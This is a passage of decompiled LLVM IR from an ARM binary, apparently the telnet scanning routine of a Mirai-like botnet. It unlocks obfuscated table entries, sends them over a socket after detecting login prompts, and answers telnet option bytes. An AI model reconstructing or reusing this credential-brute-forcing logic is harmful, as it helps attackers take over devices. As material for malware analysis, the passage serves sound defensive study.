dec_label_pc_edec:                                ; preds = %dec_label_pc_ede4
  %v2_edec = icmp ugt i8 %v3_ee00, 36
  store i1 %v2_edec, i1* %cpsr_c.global-to-local, align 1
  %v7_edec = icmp eq i8 %v3_ee00, 37
  store i1 %v7_edec, i1* %cpsr_z.global-to-local, align 1
  %v1_edf0 = add i32 %v0_edf0, -1
  store i32 %v1_edf0, i32* %r3.global-to-local, align 4
  br i1 %v7_edec, label %dec_label_pc_ee10, label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %dec_label_pc_edf8.preheader, %dec_label_pc_edec
  %v0_edf0 = phi i32 [ %v2_edd0, %dec_label_pc_edf8.preheader ], [ %v1_edf0, %dec_label_pc_edec ]
  %v0_edf8 = phi i32 [ %v1_ed98, %dec_label_pc_edf8.preheader ], [ %v1_edf8, %dec_label_pc_edec ]
  %v1_edf8 = add i32 %v0_edf8, -1
  store i32 %v1_edf8, i32* %r1.global-to-local, align 4
  %v2_edf8 = icmp ne i32 %v0_edf8, 0
  store i1 %v2_edf8, i1* %cpsr_c.global-to-local, align 1
  %v7_edf8 = icmp eq i32 %v0_edf8, 1
  store i1 %v7_edf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edf8, label %dec_label_pc_ebd4.backedge.thread559, label %dec_label_pc_ee00

dec_label_pc_ee00:                                ; preds = %dec_label_pc_edf8
  %v1_ee00 = add i32 %v0_edf0, -2
  %v2_ee00 = inttoptr i32 %v1_ee00 to i8*
  %v3_ee00 = load i8, i8* %v2_ee00, align 1
  %v4_ee00 = zext i8 %v3_ee00 to i32
  store i32 %v4_ee00, i32* %r2.global-to-local, align 4
  %v2_ee04 = icmp ugt i8 %v3_ee00, 61
  store i1 %v2_ee04, i1* %cpsr_c.global-to-local, align 1
  %v7_ee04 = icmp eq i8 %v3_ee00, 62
  store i1 %v7_ee04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee04, label %dec_label_pc_ee10, label %bb427

bb427:                                            ; preds = %dec_label_pc_ee00
  %v3_ee08 = icmp ugt i8 %v3_ee00, 57
  store i1 %v3_ee08, i1* %cpsr_c.global-to-local, align 1
  %v8_ee08 = icmp eq i8 %v3_ee00, 58
  store i1 %v8_ee08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee08, label %dec_label_pc_ee10, label %dec_label_pc_eddc

dec_label_pc_ee10:                                ; preds = %dec_label_pc_ee00, %bb427, %dec_label_pc_edec, %dec_label_pc_ede4, %dec_label_pc_eddc, %dec_label_pc_edc8, %dec_label_pc_eda4, %dec_label_pc_edc0, %dec_label_pc_edb8, %bb426
  %v0_ee14 = phi i32 [ %v1_ed98, %dec_label_pc_edc8 ], [ %v1_ed98, %dec_label_pc_eda4 ], [ %v1_ed98, %dec_label_pc_edc0 ], [ %v1_ed98, %dec_label_pc_edb8 ], [ %v1_ed98, %bb426 ], [ %v1_edf8, %dec_label_pc_eddc ], [ %v1_edf8, %dec_label_pc_ede4 ], [ %v1_edf8, %dec_label_pc_edec ], [ %v1_edf8, %bb427 ], [ %v1_edf8, %dec_label_pc_ee00 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_ee14 = add i32 %v0_ee14, 1
  store i32 %v1_ee14, i32* @r7, align 4
  %v1_ee18 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_ee28 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_ee28, i32* %r0.global-to-local, align 4
  %v3_ee2c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ee2c, i32* %r2.global-to-local, align 4
  store i32 %v3_ee28, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ee38 = load i32, i32* @r6, align 4
  %v1_ee38 = add i32 %v0_ee38, 4
  %v2_ee38 = inttoptr i32 %v1_ee38 to i32*
  %v3_ee38 = load i32, i32* %v2_ee38, align 4
  store i32 %v3_ee38, i32* %r0.global-to-local, align 4
  %v4_ee3c = call i32 @__libc_send(i32 %v3_ee38, i32 %v3_ee28, i32 %v3_ee2c, i32 16384)
  store i32 %v4_ee3c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ee4c = load i32, i32* @r6, align 4
  %v1_ee4c = add i32 %v0_ee4c, 4
  %v2_ee4c = inttoptr i32 %v1_ee4c to i32*
  %v3_ee4c = load i32, i32* %v2_ee4c, align 4
  store i32 %v3_ee4c, i32* %r0.global-to-local, align 4
  %v4_ee50 = call i32 @__libc_send(i32 %v3_ee4c, i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_ee58 = call i32 @table_lock_val(i32 8)
  store i32 %v1_ee58, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_ee60 = load i32, i32* @r6, align 4
  %v2_ee60 = add i32 %v1_ee60, 12
  %v3_ee60 = inttoptr i32 %v2_ee60 to i32*
  store i32 10, i32* %v3_ee60, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_ee68:                                ; preds = %dec_label_pc_ec50
  %v1_ee68 = add i32 %v0_ec50, 24
  %v2_ee68 = inttoptr i32 %v1_ee68 to i32*
  %v3_ee68 = load i32, i32* %v2_ee68, align 4
  store i32 %v3_ee68, i32* %r2.global-to-local, align 4
  %v1_ee6c = add i32 %v3_ee68, -1
  store i32 %v1_ee6c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee70 = icmp eq i32 %v1_ee6c, 0
  store i1 %v2_ee70, i1* %cpsr_z.global-to-local, align 1
  %tmp428 = icmp slt i32 %v1_ee6c, 1
  br i1 %tmp428, label %dec_label_pc_ebd4.backedge.thread, label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee68
  %v2_ee78 = add i32 %v1_ee6c, %v0_ec50
  store i32 %v2_ee78, i32* %r3.global-to-local, align 4
  %v1_ee7c = add i32 %v2_ee78, 28
  %v2_ee7c = inttoptr i32 %v1_ee7c to i8*
  %v3_ee7c = load i8, i8* %v2_ee7c, align 1
  %v4_ee7c = zext i8 %v3_ee7c to i32
  store i32 %v4_ee7c, i32* %r3.global-to-local, align 4
  %v2_ee80 = icmp ugt i8 %v3_ee7c, 61
  store i1 %v2_ee80, i1* %cpsr_c.global-to-local, align 1
  %v7_ee80 = icmp eq i8 %v3_ee7c, 62
  store i1 %v7_ee80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee80, label %dec_label_pc_eee4, label %bb429

bb429:                                            ; preds = %dec_label_pc_ee78
  %v3_ee84 = icmp ugt i8 %v3_ee7c, 57
  store i1 %v3_ee84, i1* %cpsr_c.global-to-local, align 1
  %v8_ee84 = icmp eq i8 %v3_ee7c, 58
  store i1 %v8_ee84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee84, label %dec_label_pc_eee4, label %dec_label_pc_ee8c

dec_label_pc_ee8c:                                ; preds = %bb429
  %v2_ee8c = icmp ugt i8 %v3_ee7c, 35
  store i1 %v2_ee8c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee8c = icmp eq i8 %v3_ee7c, 36
  store i1 %v7_ee8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee8c, label %dec_label_pc_eee4, label %dec_label_pc_ee94

dec_label_pc_ee94:                                ; preds = %dec_label_pc_ee8c
  %v2_ee94 = icmp ugt i8 %v3_ee7c, 34
  store i1 %v2_ee94, i1* %cpsr_c.global-to-local, align 1
  %v7_ee94 = icmp eq i8 %v3_ee7c, 35
  store i1 %v7_ee94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee94, label %dec_label_pc_eee4, label %dec_label_pc_ee9c

dec_label_pc_ee9c:                                ; preds = %dec_label_pc_ee94
  %v2_ee9c = icmp ugt i8 %v3_ee7c, 36
  store i1 %v2_ee9c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee9c = icmp eq i8 %v3_ee7c, 37
  store i1 %v7_ee9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee9c, label %dec_label_pc_eee4, label %dec_label_pc_eecc.preheader

dec_label_pc_eecc.preheader:                      ; preds = %dec_label_pc_ee9c
  %v3_eea0 = add i32 %v0_ec50, 28
  %v2_eea4 = add i32 %v3_eea0, %v3_ee68
  store i32 %v2_eea4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_eecc

dec_label_pc_eeb0:                                ; preds = %bb430
  %v2_eeb0 = icmp ugt i8 %v3_eed4, 35
  store i1 %v2_eeb0, i1* %cpsr_c.global-to-local, align 1
  %v7_eeb0 = icmp eq i8 %v3_eed4, 36
  store i1 %v7_eeb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eeb0, label %dec_label_pc_eee4, label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %dec_label_pc_eeb0
  %v2_eeb8 = icmp ugt i8 %v3_eed4, 34
  store i1 %v2_eeb8, i1* %cpsr_c.global-to-local, align 1
  %v7_eeb8 = icmp eq i8 %v3_eed4, 35
  store i1 %v7_eeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eeb8, label %dec_label_pc_eee4, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eeb8
  %v2_eec0 = icmp ugt i8 %v3_eed4, 36
  store i1 %v2_eec0, i1* %cpsr_c.global-to-local, align 1
  %v7_eec0 = icmp eq i8 %v3_eed4, 37
  store i1 %v7_eec0, i1* %cpsr_z.global-to-local, align 1
  %v1_eec4 = add i32 %v0_eec4, -1
  store i32 %v1_eec4, i32* %r3.global-to-local, align 4
  br i1 %v7_eec0, label %dec_label_pc_eee4, label %dec_label_pc_eecc

dec_label_pc_eecc:                                ; preds = %dec_label_pc_eecc.preheader, %dec_label_pc_eec0
  %v0_eec4 = phi i32 [ %v2_eea4, %dec_label_pc_eecc.preheader ], [ %v1_eec4, %dec_label_pc_eec0 ]
  %v0_eecc = phi i32 [ %v1_ee6c, %dec_label_pc_eecc.preheader ], [ %v1_eecc, %dec_label_pc_eec0 ]
  %v1_eecc = add i32 %v0_eecc, -1
  store i32 %v1_eecc, i32* %r1.global-to-local, align 4
  %v2_eecc = icmp ne i32 %v0_eecc, 0
  store i1 %v2_eecc, i1* %cpsr_c.global-to-local, align 1
  %v7_eecc = icmp eq i32 %v0_eecc, 1
  store i1 %v7_eecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eecc, label %dec_label_pc_ebd4.backedge.thread559, label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_eecc
  %v1_eed4 = add i32 %v0_eec4, -2
  %v2_eed4 = inttoptr i32 %v1_eed4 to i8*
  %v3_eed4 = load i8, i8* %v2_eed4, align 1
  %v4_eed4 = zext i8 %v3_eed4 to i32
  store i32 %v4_eed4, i32* %r2.global-to-local, align 4
  %v2_eed8 = icmp ugt i8 %v3_eed4, 61
  store i1 %v2_eed8, i1* %cpsr_c.global-to-local, align 1
  %v7_eed8 = icmp eq i8 %v3_eed4, 62
  store i1 %v7_eed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eed8, label %dec_label_pc_eee4, label %bb430

bb430:                                            ; preds = %dec_label_pc_eed4
  %v3_eedc = icmp ugt i8 %v3_eed4, 57
  store i1 %v3_eedc, i1* %cpsr_c.global-to-local, align 1
  %v8_eedc = icmp eq i8 %v3_eed4, 58
  store i1 %v8_eedc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eedc, label %dec_label_pc_eee4, label %dec_label_pc_eeb0

dec_label_pc_eee4:                                ; preds = %dec_label_pc_eed4, %bb430, %dec_label_pc_eec0, %dec_label_pc_eeb8, %dec_label_pc_eeb0, %dec_label_pc_ee9c, %dec_label_pc_ee78, %dec_label_pc_ee94, %dec_label_pc_ee8c, %bb429
  %v0_eee8 = phi i32 [ %v1_ee6c, %dec_label_pc_ee9c ], [ %v1_ee6c, %dec_label_pc_ee78 ], [ %v1_ee6c, %dec_label_pc_ee94 ], [ %v1_ee6c, %dec_label_pc_ee8c ], [ %v1_ee6c, %bb429 ], [ %v1_eecc, %dec_label_pc_eeb0 ], [ %v1_eecc, %dec_label_pc_eeb8 ], [ %v1_eecc, %dec_label_pc_eec0 ], [ %v1_eecc, %bb430 ], [ %v1_eecc, %dec_label_pc_eed4 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_eee8 = add i32 %v0_eee8, 1
  store i32 %v1_eee8, i32* @r7, align 4
  %v1_eeec = call i32 @table_unlock_val(i32 7)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_eefc = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_eefc, i32* %r0.global-to-local, align 4
  %v3_ef00 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ef00, i32* %r2.global-to-local, align 4
  store i32 %v3_eefc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ef0c = load i32, i32* @r6, align 4
  %v1_ef0c = add i32 %v0_ef0c, 4
  %v2_ef0c = inttoptr i32 %v1_ef0c to i32*
  %v3_ef0c = load i32, i32* %v2_ef0c, align 4
  store i32 %v3_ef0c, i32* %r0.global-to-local, align 4
  %v4_ef10 = call i32 @__libc_send(i32 %v3_ef0c, i32 %v3_eefc, i32 %v3_ef00, i32 16384)
  store i32 %v4_ef10, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ef20 = load i32, i32* @r6, align 4
  %v1_ef20 = add i32 %v0_ef20, 4
  %v2_ef20 = inttoptr i32 %v1_ef20 to i32*
  %v3_ef20 = load i32, i32* %v2_ef20, align 4
  store i32 %v3_ef20, i32* %r0.global-to-local, align 4
  %v4_ef24 = call i32 @__libc_send(i32 %v3_ef20, i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_ef2c = call i32 @table_lock_val(i32 7)
  store i32 %v1_ef2c, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_ef34 = load i32, i32* @r6, align 4
  %v2_ef34 = add i32 %v1_ef34, 12
  %v3_ef34 = inttoptr i32 %v2_ef34 to i32*
  store i32 9, i32* %v3_ef34, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ec50
  %v1_ef3c = add i32 %v0_ec50, 24
  %v2_ef3c = inttoptr i32 %v1_ef3c to i32*
  %v3_ef3c = load i32, i32* %v2_ef3c, align 4
  store i32 %v3_ef3c, i32* %r1.global-to-local, align 4
  %v0_ef40 = load i32, i32* @sb, align 4
  store i32 %v0_ef40, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_ef48166 = icmp eq i32 %v3_ef3c, 0
  store i1 %v3_ef48166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_ef48166, i1* %cpsr_z.global-to-local, align 1
  %v6_ef4c173 = icmp sgt i32 %v3_ef3c, 0
  br i1 %v6_ef4c173, label %dec_label_pc_ef50.preheader, label %dec_label_pc_effc

dec_label_pc_ef48.loopexit:                       ; preds = %dec_label_pc_ef6c
  %v2_ef74 = add i32 %v1_ef74, 2
  store i32 %v2_ef74, i32* @r4, align 4
  %v2_ef78 = add i32 %v1_ef78, 2
  store i32 %v2_ef78, i32* @r7, align 4
  %v3_ef48 = icmp uge i32 %v2_ef78, %v1_ef48
  store i1 %v3_ef48, i1* %cpsr_c.global-to-local, align 1
  %v9_ef48 = icmp eq i32 %v2_ef78, %v1_ef48
  store i1 %v9_ef48, i1* %cpsr_z.global-to-local, align 1
  %v6_ef4c = icmp slt i32 %v2_ef78, %v1_ef48
  br i1 %v6_ef4c, label %dec_label_pc_ef50.preheader, label %dec_label_pc_effc

dec_label_pc_ef50.preheader:                      ; preds = %dec_label_pc_ef3c, %dec_label_pc_ef48.loopexit
  %v6_f004273 = phi i32 [ %v6_f004274, %dec_label_pc_ef48.loopexit ], [ %v0_ec50, %dec_label_pc_ef3c ]
  %v1_ef78262 = phi i32 [ %v2_ef78, %dec_label_pc_ef48.loopexit ], [ 0, %dec_label_pc_ef3c ]
  %v1_ef5c260 = phi i32 [ %v1_ef48, %dec_label_pc_ef48.loopexit ], [ %v3_ef3c, %dec_label_pc_ef3c ]
  %v0_ef50258 = phi i32 [ %v2_ef74, %dec_label_pc_ef48.loopexit ], [ %v0_ef40, %dec_label_pc_ef3c ]
  br label %dec_label_pc_ef50

dec_label_pc_ef50:                                ; preds = %dec_label_pc_ef50.preheader, %dec_label_pc_efe0
  %v6_f004274 = phi i32 [ %v6_f004273, %dec_label_pc_ef50.preheader ], [ %v0_efe8, %dec_label_pc_efe0 ]
  %v1_ef78 = phi i32 [ %v1_ef78262, %dec_label_pc_ef50.preheader ], [ %v1_efec, %dec_label_pc_efe0 ]
  %v1_ef48 = phi i32 [ %v1_ef5c260, %dec_label_pc_ef50.preheader ], [ %v3_efe8, %dec_label_pc_efe0 ]
  %v1_ef74 = phi i32 [ %v0_ef50258, %dec_label_pc_ef50.preheader ], [ %v1_eff4, %dec_label_pc_efe0 ]
  %v1_ef50 = inttoptr i32 %v1_ef74 to i8*
  %v2_ef50 = load i8, i8* %v1_ef50, align 1
  %v3_ef50 = zext i8 %v2_ef50 to i32
  store i32 %v3_ef50, i32* @r3, align 4
  %v2_ef54 = icmp eq i8 %v2_ef50, -1
  store i1 %v2_ef54, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_ef54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef54, label %dec_label_pc_ef5c, label %dec_label_pc_effc

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef50
  %v0_ef5c = load i32, i32* @sb, align 4
  %v2_ef5c = add i32 %v0_ef5c, %v1_ef48
  store i32 %v2_ef5c, i32* %r2.global-to-local, align 4
  %v1_ef60 = add i32 %v1_ef74, 1
  store i32 %v1_ef60, i32* @r5, align 4
  %v3_ef64 = icmp uge i32 %v2_ef5c, %v1_ef60
  store i1 %v3_ef64, i1* %cpsr_c.global-to-local, align 1
  %v9_ef64 = icmp eq i32 %v2_ef5c, %v1_ef60
  store i1 %v9_ef64, i1* %cpsr_z.global-to-local, align 1
  %v2_ef68 = xor i1 %v3_ef64, true
  %v3_ef68 = or i1 %v9_ef64, %v2_ef68
  br i1 %v3_ef68, label %dec_label_pc_effc, label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_ef5c
  %v2_ef6c = inttoptr i32 %v1_ef60 to i8*
  %v3_ef6c = load i8, i8* %v2_ef6c, align 1
  %v4_ef6c = zext i8 %v3_ef6c to i32
  store i32 %v4_ef6c, i32* @r3, align 4
  %v2_ef70 = icmp eq i8 %v3_ef6c, -1
  store i1 %v2_ef70, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_ef70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef70, label %dec_label_pc_ef48.loopexit, label %dec_label_pc_ef80

dec_label_pc_ef80:                                ; preds = %dec_label_pc_ef6c
  %v2_ef80 = icmp ugt i8 %v3_ef6c, -4
  store i1 %v2_ef80, i1* %cpsr_c.global-to-local, align 1
  %v7_ef80 = icmp eq i8 %v3_ef6c, -3
  store i1 %v7_ef80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef80, label %dec_label_pc_f514, label %dec_label_pc_ef88

dec_label_pc_ef88:                                ; preds = %dec_label_pc_ef80
  %v1_ef88 = add i32 %v1_ef74, 2
  store i32 %v1_ef88, i32* @r3, align 4
  %v3_ef8c = icmp uge i32 %v2_ef5c, %v1_ef88
  store i1 %v3_ef8c, i1* %cpsr_c.global-to-local, align 1
  %v9_ef8c = icmp eq i32 %v2_ef5c, %v1_ef88
  store i1 %v9_ef8c, i1* %cpsr_z.global-to-local, align 1
  %v2_ef90 = xor i1 %v3_ef8c, true
  %v3_ef90 = or i1 %v9_ef8c, %v2_ef90
  br i1 %v3_ef90, label %dec_label_pc_effc, label %dec_label_pc_ef94

dec_label_pc_ef94:                                ; preds = %dec_label_pc_f578, %bb452, %.thread138, %dec_label_pc_ef88
  %v0_ef94 = load i32, i32* @r5, align 4
  %v1_ef94 = inttoptr i32 %v0_ef94 to i8*
  %v2_ef94 = load i8, i8* %v1_ef94, align 1
  %v3_ef94 = zext i8 %v2_ef94 to i32
  store i32 %v3_ef94, i32* %r3.global-to-local, align 4
  %v2_ef98 = icmp ugt i8 %v2_ef94, -4
  store i1 %v2_ef98, i1* %cpsr_c.global-to-local, align 1
  %v7_ef98 = icmp eq i8 %v2_ef94, -3
  store i1 %v7_ef98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef98, label %.thread96, label %dec_label_pc_efa8

.thread96:                                        ; preds = %dec_label_pc_ef94
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_ef94, align 1
  %v0_efa4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_efa4.pr.pr, label %.thread99, label %.thread96.dec_label_pc_efa8thread-pre-split_crit_edge

.thread96.dec_label_pc_efa8thread-pre-split_crit_edge: ; preds = %.thread96
  %v0_efa8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_efa8

dec_label_pc_efa8:                                ; preds = %dec_label_pc_ef94, %.thread96.dec_label_pc_efa8thread-pre-split_crit_edge
  %v0_efa8.pr = phi i32 [ %v0_efa8.pr.pre, %.thread96.dec_label_pc_efa8thread-pre-split_crit_edge ], [ %v3_ef94, %dec_label_pc_ef94 ]
  %v2_efa8 = icmp ugt i32 %v0_efa8.pr, 250
  store i1 %v2_efa8, i1* %cpsr_c.global-to-local, align 1
  %v7_efa8 = icmp eq i32 %v0_efa8.pr, 251
  store i1 %v7_efa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efa8, label %bb431, label %.thread99

bb431:                                            ; preds = %dec_label_pc_efa8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_efb0 = load i32, i32* @r5, align 4
  %v4_efb0 = inttoptr i32 %v3_efb0 to i8*
  store i8 -3, i8* %v4_efb0, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_efa8, %.thread96, %bb431
  %v0_efb4 = load i32, i32* @r4, align 4
  %v1_efb4 = add i32 %v0_efb4, 2
  %v2_efb4 = inttoptr i32 %v1_efb4 to i8*
  %v3_efb4 = load i8, i8* %v2_efb4, align 1
  %v4_efb4 = zext i8 %v3_efb4 to i32
  store i32 %v4_efb4, i32* %r3.global-to-local, align 4
  %v2_efb8 = icmp ugt i8 %v3_efb4, -4
  store i1 %v2_efb8, i1* %cpsr_c.global-to-local, align 1
  %v7_efb8 = icmp eq i8 %v3_efb4, -3
  store i1 %v7_efb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efb8, label %.thread100, label %dec_label_pc_efc8

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_efb4, align 1
  %v0_efc4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_efc4.pr.pr, label %.thread103, label %.thread100.dec_label_pc_efc8thread-pre-split_crit_edge

.thread100.dec_label_pc_efc8thread-pre-split_crit_edge: ; preds = %.thread100
  %v0_efc8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_efc8

dec_label_pc_efc8:                                ; preds = %.thread99, %.thread100.dec_label_pc_efc8thread-pre-split_crit_edge
  %v0_efc8.pr = phi i32 [ %v0_efc8.pr.pre, %.thread100.dec_label_pc_efc8thread-pre-split_crit_edge ], [ %v4_efb4, %.thread99 ]
  %v2_efc8 = icmp ugt i32 %v0_efc8.pr, 250
  store i1 %v2_efc8, i1* %cpsr_c.global-to-local, align 1
  %v7_efc8 = icmp eq i32 %v0_efc8.pr, 251
  store i1 %v7_efc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efc8, label %bb432, label %.thread103

bb432:                                            ; preds = %dec_label_pc_efc8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_efd0 = load i32, i32* @r4, align 4
  %v4_efd0 = add i32 %v3_efd0, 2
  %v5_efd0 = inttoptr i32 %v4_efd0 to i8*
  store i8 -3, i8* %v5_efd0, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_efc8, %.thread100, %bb432
  %v0_efd4 = load i32, i32* @r6, align 4
  %v1_efd4 = add i32 %v0_efd4, 4
  %v2_efd4 = inttoptr i32 %v1_efd4 to i32*
  %v3_efd4 = load i32, i32* %v2_efd4, align 4
  store i32 %v3_efd4, i32* %r0.global-to-local, align 4
  %v0_efd8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_efe0

dec_label_pc_efe0:                                ; preds = %dec_label_pc_f68c, %.thread103
  %v0_efe4 = phi i32 [ %v3_f6a0, %dec_label_pc_f68c ], [ %v3_efd4, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f52c, %dec_label_pc_f68c ], [ %v0_efd8, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_f68c ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_efe4 = call i32 @__libc_send(i32 %v0_efe4, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_efe4, i32* %r0.global-to-local, align 4
  %v0_efe8 = load i32, i32* @r6, align 4
  %v1_efe8 = add i32 %v0_efe8, 24
  %v2_efe8 = inttoptr i32 %v1_efe8 to i32*
  %v3_efe8 = load i32, i32* %v2_efe8, align 4
  store i32 %v3_efe8, i32* %r1.global-to-local, align 4
  %v0_efec = load i32, i32* @r7, align 4
  %v1_efec = add i32 %v0_efec, 3
  store i32 %v1_efec, i32* @r7, align 4
  %v3_eff0 = icmp uge i32 %v1_efec, %v3_efe8
  store i1 %v3_eff0, i1* %cpsr_c.global-to-local, align 1
  %v9_eff0 = icmp eq i32 %v1_efec, %v3_efe8
  store i1 %v9_eff0, i1* %cpsr_z.global-to-local, align 1
  %v0_eff4 = load i32, i32* @r4, align 4
  %v1_eff4 = add i32 %v0_eff4, 3
  store i32 %v1_eff4, i32* @r4, align 4
  %v5_eff8 = icmp slt i32 %v1_efec, %v3_efe8
  br i1 %v5_eff8, label %dec_label_pc_ef50, label %dec_label_pc_effc

dec_label_pc_effc:                                ; preds = %dec_label_pc_ef48.loopexit, %dec_label_pc_ef50, %dec_label_pc_efe0, %dec_label_pc_ef88, %dec_label_pc_ef5c, %dec_label_pc_ef3c, %dec_label_pc_f514.dec_label_pc_effc.loopexit_crit_edge
  %v6_f004 = phi i32 [ %v0_f544, %dec_label_pc_f514.dec_label_pc_effc.loopexit_crit_edge ], [ %v0_ec50, %dec_label_pc_ef3c ], [ %v6_f004274, %dec_label_pc_ef50 ], [ %v0_efe8, %dec_label_pc_efe0 ], [ %v6_f004274, %dec_label_pc_ef88 ], [ %v6_f004274, %dec_label_pc_ef5c ], [ %v6_f004274, %dec_label_pc_ef48.loopexit ]
  %v0_effc = phi i32 [ %v0_effc.pre.pre, %dec_label_pc_f514.dec_label_pc_effc.loopexit_crit_edge ], [ 0, %dec_label_pc_ef3c ], [ %v1_ef78, %dec_label_pc_ef50 ], [ %v1_efec, %dec_label_pc_efe0 ], [ %v1_ef78, %dec_label_pc_ef88 ], [ %v1_ef78, %dec_label_pc_ef5c ], [ %v2_ef78, %dec_label_pc_ef48.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_effc = icmp eq i32 %v0_effc, 0
  store i1 %v2_effc, i1* %cpsr_z.global-to-local, align 1
  %tmp433 = icmp slt i32 %v0_effc, 1
  br i1 %tmp433, label %dec_label_pc_f3e8, label %bb434

bb434:                                            ; preds = %dec_label_pc_effc
  store i32 3, i32* @r3, align 4
  %v7_f004 = add i32 %v6_f004, 12
  %v8_f004 = inttoptr i32 %v7_f004 to i32*
  store i32 3, i32* %v8_f004, align 4
  br label %dec_label_pc_f3e8

dec_label_pc_f00c:                                ; preds = %dec_label_pc_ec50
  %v1_f00c = add i32 %v0_ec50, 24
  %v2_f00c = inttoptr i32 %v1_f00c to i32*
  %v3_f00c = load i32, i32* %v2_f00c, align 4
  store i32 %v3_f00c, i32* %r2.global-to-local, align 4
  %v1_f010 = add i32 %v3_f00c, -1
  store i32 %v1_f010, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f014 = icmp eq i32 %v1_f010, 0
  store i1 %v2_f014, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v1_f010, 1
  br i1 %tmp435, label %dec_label_pc_ebd4.backedge.thread, label %dec_label_pc_f01c

dec_label_pc_f01c:                                ; preds = %dec_label_pc_f00c
  %v2_f01c = add i32 %v1_f010, %v0_ec50
  store i32 %v2_f01c, i32* %r3.global-to-local, align 4
  %v1_f020 = add i32 %v2_f01c, 28
  %v2_f020 = inttoptr i32 %v1_f020 to i8*
